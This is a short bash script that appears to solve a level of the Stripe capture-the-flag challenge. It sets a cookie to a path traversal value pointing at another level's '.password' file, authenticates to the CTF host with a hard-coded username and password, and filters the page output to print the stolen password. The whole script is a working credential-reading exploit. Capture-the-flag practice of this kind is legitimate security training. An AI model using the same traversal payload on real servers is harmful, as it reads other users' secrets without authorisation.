#!/usr/bin/env bash
curl -s --cookie "user_details=../../home/level03/.password" --digest --user level02:kxlVXUvzv http://ctf.stri.pe/level02.php | grep "<p>" | cut -d'>' -f2
